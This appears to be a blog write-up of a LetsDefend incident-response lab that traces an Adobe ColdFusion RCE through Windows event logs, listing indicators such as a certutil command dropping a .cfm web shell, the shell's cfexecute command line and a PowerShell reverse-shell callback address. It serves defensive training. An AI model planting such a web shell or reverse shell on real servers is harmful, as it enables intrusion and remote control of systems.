---
layout: post
title: Adobe ColdFusion RCE
subtitle: LetsDefend Writeup
gh-repo: daattali/beautiful-jekyll
tags: LetsDefend, Windows, Security Analyst
comments: false
mathjax: true
---
**Category:** Security Analyst

**Difficulty:** Medium

**Scenario:** Our EDR software was triggered, alerted, and isolated a web server for suspicious use of the “nltest.exe” command. Investigate the Windows Event logs to determine what occurred.

# Task 1
**Question**: The testing process utilizes a third-party service to determine if the server is susceptible to remote code execution. What is the complete URL of the third-party service?

We can start by reviewing the oldest events in the provided Windows Event Logs, which reveals a malicious PowerShell command being ran. 

![image](/assets/img/RCE1.png)

This command is encoded in Base64 (hinted at the by '==' at the end of the command), so we can decode is with CyberChef:

![image](/assets/img/RCE2.png)

~~~
https://webhook.site/33c1dca9-b63a-470d-8d6d-cb46b76932ae
~~~

# Task 2: 
**Question**: What was the IP of the third-party service to determine if the server is susceptible to remote code execution?

Sysmon Event Code 22 (DNSEvent) allows us to monitor queries and results that are being sent back by the DNS server that's in communication with the TA, so we can analyze these events to try to find the IP of the third-party service:

![image](/assets/img/RCE3.png)

~~~
46.4.105.116
~~~

# Task 3: 
**Question**: The attacker drops a web shell backdoor. What is the web shell backdoor script written in?

Going through more of our event logs we come across another command being run which shows interesting information:

![image](/assets/img/RCE4.png)

Donig a simple Google search of the code reveals the script is written in **ColdFusion Markup Language** 

~~~
ColdFusion Markup Language
~~~

# Task 4: 
**Question**: What is the attacker’s working directory when injecting the web shell script?

Going back to our Sysmon event logs, we can take note of the 'CurrentDirectory' field to find out the attacker's working directory when they injected the web shell script:

![image](/assets/img/RCE5.png)

~~~
C:\Fusion21\cfusion\bin\
~~~

# Task 5: 
**Question**: The web shell was saved to what file?

Also withi nthe same log, we can turn to the 'CommandLine' field to find some interesting information. The command is: 'certutil -decode 123.tmp ..\wwwroot\cf_scripts\cfclient\huqVgdoFd.cfm' 

![image](/assets/img/RCE6.png)

~~~
..\wwwroot\cf_scripts\cfclient\huqVgdoFd.cfm
~~~

# Task 6: 
**Question**: What is the full execution command string in the web shell backdoor?

In the previously decoded Powershell command, we come across this 'cfexecute' (execution command) which is the full execution command string in the web shell backdoor:


![image](/assets/img/RCE7.png)

~~~
<cfexecute name="#p#" arguments='#a# "#c#"' outputfile="#GetTempDirectory()#f" errorFile="#GetTempDirectory()#f" timeout=1></cfexecute>
~~~

# Task 7: 
**Question**: The Attacker creates a reverse shell with PowerShell. What is the IP and port number the reverse shell calls back to?

The last notable event in these logs contains another Base64 encoded Powershell command as shown:

![image](/assets/img/RCE8.png)

We can see the use of **reordering string concatenation**. This type of obfuscation can be seen throughout this decoded script such as with ${H`St} = ("{3}{0}{1}{2}" -f'.100.23','3.20','1','185');, etc. This can be further deobfuscated using PowerShell ISE:

![image](/assets/img/RCE9.png)

~~~
185.100.233.201:80
~~~

# Task 8: 
**Question**: Based on the details of the log, what underlining software is the website coded in?

~~~
Adobe ColdFusion
~~~

# Task 9: 
**Question**: Based on the software the website runs on and the date of the intrusion, what CVE was the attacker likely using to get remote code execution on the server?

~~~
CVE-2023-26360
~~~






